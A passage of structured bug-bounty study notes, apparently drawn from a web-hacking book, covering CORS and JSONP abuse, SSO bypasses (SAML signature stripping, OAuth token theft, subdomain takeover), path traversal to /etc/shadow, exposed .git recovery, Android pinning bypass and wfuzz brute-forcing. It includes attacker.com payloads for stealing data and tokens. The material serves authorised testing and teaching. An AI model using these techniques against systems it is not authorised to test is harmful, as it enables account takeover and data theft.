Step 2: For CORS, test three patterns. Set 'Origin: null' (e.g. via a data: doc) and check if A-C-A-O = null. Set 'Origin: attacker.com' and check if reflected. Set 'Origin: www.example.com.attacker.com' to probe weak regex.

Step 3: For postMessage, build a malicious page that opens/frames the target, then either postMessage to trigger a state change (if receiver doesn't check event.origin) or addEventListener to harvest data (if sender uses wildcard '*' target origin).
Step 4: For JSONP, embed '<script src="https://target/user_info?callback=parseinfo"></script>' on attacker.com and steal data through your parseinfo function.

Step 5: Consider mitigations — if the target authenticates via custom headers (not cookies), CORS misconfigs may be unexploitable; if A-C-A-O is wildcard '*', credentials are NOT sent so it's not exploitable.
tools_and_payloads: Custom HTML pages with iframes / window.open / postMessage / addEventListener
bypass_techniques: Force a 'null' origin via data: documents or sandboxed iframes.
Exploit weak regexes that only check 'startsWith' or 'contains example.com'.
Sender postMessage with target '*' leaks data; absent event.origin check on receiver accepts attacker messages.
Use XSS as a complete SOP bypass (script runs in victim's origin).
escalation_impact_tips: CORS misconfig on authenticated endpoint -> read DMs, profile data, tokens.
postMessage missing origin check -> trigger password change as victim.
JSONP -> harvest authenticated JSON over <script>.
Automate exploitation to harvest many users' data when applicable.
report_template_hints: Always include real impact data (what you can read or do as the attacker).
Reporting bare A-C-A-O: null on a public page is usually not accepted — show authenticated context.

chapters.title: Single-Sign-On Security Issues
chapters.vulnerability_class: SSO bypass (cookie sharing + subdomain takeover, SAML signature bypass, OAuth token theft, long-lived tokens)
methodology: Determine SSO mechanism: check Set-Cookie 'Domain=' attribute (cookie sharing), look for XML/SAML messages or saml keyword (SAML), look for oauth/authorize/redirect_uri (OAuth).

Subdomain takeover hunting: Step 1 enumerate subdomains (Ch 5) -> Step 2 screenshot with EyeWitness/Snapper -> find unregistered third-party pages (look for GitHub Pages 'There isn't a GitHub Pages site here', AWS, Heroku, etc.; reference EdOverflow/can-i-take-over-xyz) -> Step 3 register the page on the third-party host and prove with a benign HTML POC. Then check if shared cookies (Domain=parent.com) flow to your new subdomain.

SAML hunting: Step 1 intercept the SAML response. Step 2 analyze fields (username/email/userID). Step 3 try modifying the identity field; if signature missing -> done. If signature present, try empty signature, removed signature element, or reverse-engineer weak signing (e.g., base64(username) -> recompute). Step 4 re-encode and replay using SAML Raider (Burp extension).

OAuth hunting: identify redirect_uri allowlist; find open redirect within an allowlisted URL (use Ch 7 techniques) and chain it to leak access_token from URL fragment. Also test referer-based open redirect by initiating OAuth from attacker.com. Check long-lived tokens by reusing tokens after logout / password reset.
Build a continuous subdomain-takeover monitor: scan subdomains daily, resolve CNAME, check signature strings, cron to alert.
bypass_techniques: Cookie sharing: take over an unused subdomain via dangling CNAME on AWS/Bitbucket/GitHub Pages (Squarespace/Google Cloud verify ownership and are not vulnerable).
SAML: empty <SignatureValue>, remove the <Signature> element, replay another user's signature, or forge a predictable signature (base64-based).
SAML: tamper with encrypted-but-not-signed messages; smuggle SQLi/XSS/XXE through SAML attribute fields.
OAuth: parameter-based open redirect chained as redirect_uri (e.g., 'https://example.com/callback?next=attacker.com') to leak access_token from URL fragment.
OAuth: referer-based open redirect by linking from attacker.com to login_via_facebook then watching referer leak the token.
OAuth open-redirect-chains: pass through a callback URL whose 'next' points to an open redirect on another allowed URL.
escalation_impact_tips: Subdomain takeover + shared session cookies -> total app compromise (steal session of any logged-in SSO user).
Subdomain takeover alone -> phishing on legit domain.
SAML signature bypass -> log in as any user, including admin.
OAuth access_token theft -> full account access; long-lived tokens persist post-password-reset.
Pivot stolen creds across the org's internal apps that share SSO.
report_template_hints: Keep the takeover registered until fixed (else a real attacker could grab it).
Host only a benign 'Subdomain Takeover by <name>' HTML POC.
For SAML, include the tampered message and the resulting authenticated session.
For OAuth, include the crafted URL and a screenshot of the leaked token on attacker.com logs.

chapters.title: Information Disclosure
chapters.vulnerability_class: Information Disclosure (path traversal, Wayback, paste sites, .git exposure, HTML/JS source leaks)
methodology: Step 1: Path traversal — manipulate filepath params with '../' (and URL-encoded variants %2e%2e%2f, %252e%252e%255f, ..%2f) to reach /etc/shadow, /etc/passwd, config files, source code.

Step 2: Search Wayback Machine: visit https://web.archive.org/web/*/DOMAIN/* to list archived URLs, then filter by /admin, .conf, .env, .js, .php to find sensitive or deprecated endpoints. Download interesting archived pages and grep for secrets.
Step 3: Search paste dumps: Pastebin API, GitHub gists. Use pastebin-scraper (streaak/pastebin-scraper, './scrape.sh -g KEYWORD') and PasteHunter.

Step 4: Exposed .git directory.
- Check https://target/.git (404 = safe, 403 = present-no-listing, 200/listing = jackpot).
- If listing: 'wget -r target/.git'.
- If no listing but /.git/config readable: rebuild from HEAD -> refs/heads/master -> objects/<2 chars>/<rest>. Use 'git cat-file -t/-p' locally; decompress with 'ruby -rzlib -e "print Zlib::Inflate.new.inflate(STDIN.read)" < OBJFILE' or Python zlib.
Step 5: Information in public HTML/JS — View Source, grep JS files for keys/api_key/password/token; find JS files with LinkFinder.
bypass_techniques: Path traversal encoding bypasses: %2e%2e%2f, %252e%252e%255f, ..%2f, mixed case, null bytes.
escalation_impact_tips: Validate any leaked credentials by using them — outdated keys aren't vulnerabilities.
Internal IPs / version numbers feed into SSRF and CVE-driven RCE.
Full .git reconstruction -> conduct white-box code review (Ch 22) for SQLi/XSS/etc.
Leaked admin password -> account takeover; leaked API tokens -> data access.
report_template_hints: Show the leak (file path / archived URL / Git object hash) and the sensitive data inside.
Demonstrate that creds still work (without abusing access).
Tie the leak to a concrete escalation (SSRF, CVE, RCE) for severity.

chapters.title: Conducting Code Reviews
methodology:
Fast (grep) approach. Grep for dangerous functions per language:
- PHP: eval(), assert(), system(), exec(), shell_exec(), passthru(), popen(), backticks, include(), require(), unserialize().
- Python: eval(), exec(), os.system(), pickle.loads(), yaml.load().
- JavaScript: document.write(), document.writeln(), document.location.href().
- Ruby: system(), exec(), %x(), backticks, Marshal.load(), yaml.load().
Search for leaked secrets: regex for hex/base64 patterns ([a-f0-9]{40} for GitHub tokens), keywords key/secret/password/encrypt/API/login/token. Use TruffleHog entropy scanning.
Search for weak crypto/hashing: ECB, MD4, MD5, RC4 — look at variable and function names.
Review new patches and commit history (recent code is buggier); list outdated dependencies via package manifests; cross-reference CVE database; run OWASP Dependency-Check.
Grep developer comments (#, //) for 'todo', 'fix', 'completed', 'config', 'setup', 'removed' — often points at known issues.
Find debug functionality and config files: grep HTTP/HTTPS/FTP/dev strings, file extensions .conf/.env/.cnf/.cfg/.ini/.sys/.plist.

Detailed approach: read code for important functions (auth, password reset, state changes, sensitive reads) and trace user input from entry to all sinks (HTTP params, headers, paths, DB reads, file ops).
Practice with sample programs — recognize SQLi, open redirect via Location header, command injection in wget invocations, weak referer/CSRF checks, etc.
tools_and_payloads: Static Analysis Security Testing (SAST) tools (commercial + open-source)
escalation_impact_tips: White-box review finds bugs (SQLi, deserialization, weak crypto) that black-box testing misses.
Once a creds leak is found in code, validate access before reporting.
report_template_hints: Reference exact file path and line numbers from the source.
Show the dangerous code snippet and trace user input to the sink.
Suggest a concrete fix (prepared statements, allowlist, parameterized API).

chapters.title: Hacking Android Apps
chapters.vulnerability_class: Mobile (Android) — web vulns over mobile endpoints + mobile-specific issues
methodology: Set up mobile proxy: in Burp Proxy Options add a listener bound to All Interfaces on an unused port; on Android device set Wi-Fi proxy to your computer's IP and that port. Use 'hostname -i' (Linux) or 'ipconfig getifaddr en0' (Mac) for your IP.
Install Burp's CA cert via http://burp/cert on the device; trust it for VPN and apps.

Bypass certificate pinning: use Frida + Universal Android SSL Pinning Bypass script, or Objection's 'android sslpinning disable'. For custom pinning, overwrite the packaged cert or patch the validation code.

Anatomy of APK: AndroidManifest.xml (package, components: Activities/Services/BroadcastReceivers/ContentProviders, permissions), classes.dex (compiled source), resources.arsc, res/, lib/, assets/, META-INF/ (signature).

Tooling: ADB ('adb devices -l', 'adb install', 'adb pull', 'adb push'); Android Studio (modify + emulate); Apktool ('apktool d example.apk' to extract, 'apktool b example -o example.apk' to repack); Frida for runtime instrumentation; MobSF for automated static+dynamic.

Hunting: review code in classes.dex, look for hardcoded secrets in res/values/strings.xml and .db/.sqlite files, intercept HTTPS traffic for unique mobile endpoints, compare auth between mobile and web (mobile endpoints often less-tested), look for session management flaws (long-lived tokens, no expiry, reused tokens), insecure crypto / hardcoded keys.
Treat mobile as additional surface for IDOR/SQLi/XSS/etc. — use the same Burp methodology.
bypass_techniques: SSL pinning bypass via Frida/Objection (automated) or manual cert/code patching.
escalation_impact_tips: Mobile endpoints often expose IDORs or broken auth web app fixed.
Hardcoded API keys in strings.xml / lib / assets feed into other attacks.
Sessions that survive logout/password reset enable persistent takeover.
report_template_hints: Mention the APK version reviewed and how it was extracted.
Provide Burp request showing the vulnerable mobile-only endpoint.
If pinning was bypassed, document the tool used.

chapters.title: API Hacking
chapters.vulnerability_class: REST / SOAP / GraphQL API vulnerabilities (broken access control, info leaks, no rate limiting, classic web bugs over APIs)
methodology: Recon: read public API docs; check Swagger ('site:target inurl:swagger') for internal docs; browse the app with a proxy to capture API calls; deduce additional endpoints from REST naming patterns ('/posts/ID/read' -> '/posts/ID/edit'); query GraphQL introspection ({__schema{types{name}}}, {__type(name:"X"){fields{name}}}); find WSDL files (add '?wsdl' or '.wsdl' to SOAP endpoints); try older versions ('/api/v1/...' when v2 is in use); use fuzzing wordlists (yassineaboukir gist) for endpoint discovery.
Document every endpoint, its parameters, required tokens, and auth mechanisms.

Test broken access control: lower-priv account hitting high-priv endpoints; remove tokens / add admin=1 cookie; switch HTTP methods (GET/POST/PUT/PATCH/DELETE); swap user IDs in API calls; in GraphQL, replay another user's mutation.
Test rate limiting: send 100-200 requests with Burp Intruder or curl on auth endpoints and ID-guessing endpoints. Always get permission and throttle to avoid DoS.

Test classic web bugs over APIs: SSRF in URL params, race conditions, path traversal in file params, LFI/RFI in file-include params, XXE on XML APIs, insecure deserialization on serialized APIs, reflected XSS when API params are reflected, SQLi everywhere.
GraphQL-specific: misconfigured authorization on mutations, info leaks via overly verbose responses, introspection often enabled by accident.
tools_and_payloads: Burp Intruder / curl for rate-limit testing
bypass_techniques: Old API versions: '/api/v1/...' often lacks newer fixes.
Different HTTP methods often bypass access controls.
GraphQL endpoints often have separate auth from REST/web.
Bypass disabled introspection by inferring schema with Clairvoyance.
escalation_impact_tips: Endpoint that returns user profile may also return private API tokens of profile owner -> account takeover.
Lack of rate limit + sequential resource IDs -> mass enumeration of user data.
GraphQL mutation auth misconfig -> tamper with any user's data.
XXE/SSRF/RCE via XML/SOAP APIs.
report_template_hints: Include the exact API call, raw JSON/XML, and the leaked field.
Always note the API version tested.
For rate-limit reports, prove exploitability (brute-force creds, harvest IDs) not just absence.

chapters.title: Automatic Vulnerability Discovery Using Fuzzers
methodology: Step 1: Determine data injection points — URL params, body params, headers, cookies. Classify by likely vuln (e.g., numeric ID -> IDOR, search box -> XSS).
Step 2: Choose payload lists tailored to each vuln. Use SecLists, Big List of Naughty Strings, FuzzDB. Also generate random/long/special-char payloads.

Step 3: Fuzz. With Burp Intruder mark positions and select payloads (Community is throttled). With Wfuzz, place 'FUZZ' in the URL/body and supply '-w wordlist': 'wfuzz -w wordlist.txt -f output.txt --hc 404 --follow http://target/FUZZ'.
For authentication brute-forcing: 'wfuzz -w users.txt -w pass.txt --basic FUZZ:FUZ2Z http://target/admin' or fuzz a custom 'Authorization: Basic FUZZ' header.
For IDOR/open redirect: 'wfuzz -w ids.txt http://target/inbox?user_id=FUZZ', 'wfuzz -w wordlist.txt -v --follow http://target?redirect=FUZZ'.
For XSS reflection check: 'wfuzz -w xss.txt --filter "content~FUZZ" http://target/get_user?user_id=FUZZ'.
For SQLi: 'wfuzz -w sqli.txt -d "user_id=FUZZ" http://target/get_user', watch for response length/time anomalies.
Step 4: Monitor results — filter by status code (--hc 404), content length, response time. Look for outliers.
tools_and_payloads: Burp Intruder (Pro recommended; Community is throttled)
Sublist3r source (read to learn enumerator architecture)
bypass_techniques: Throttle requests to respect rate limits and avoid bans / DoS.
Vary headers (User-Agent, custom auth headers) to slip past WAFs.
escalation_impact_tips: Fuzzing finds basic bugs (XSS, SQLi, path enumeration, weak auth); business-logic bugs still require manual review.
Always pair fuzzing with manual triage — fuzzers are 'metal detectors'.
report_template_hints: Provide the exact Wfuzz/Intruder command and wordlist used.
Document the discriminating signal (status code, content length, timing) that flagged the bug.
